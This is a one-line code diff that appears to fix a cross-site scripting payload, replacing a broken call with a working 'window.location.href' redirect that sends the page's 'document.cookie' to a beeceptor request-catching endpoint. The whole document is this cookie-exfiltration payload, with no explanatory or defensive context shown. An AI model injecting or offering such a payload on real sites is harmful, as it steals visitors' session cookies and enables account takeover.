@@ -1,1 +1,1 @@
-document.location('https://app.beeceptor.com/console/nootceptor/#'+document.cookie)
+window.location.href = "https://nootceptor.free.beeceptor.com/#" + encodeURIComponent(document.cookie);
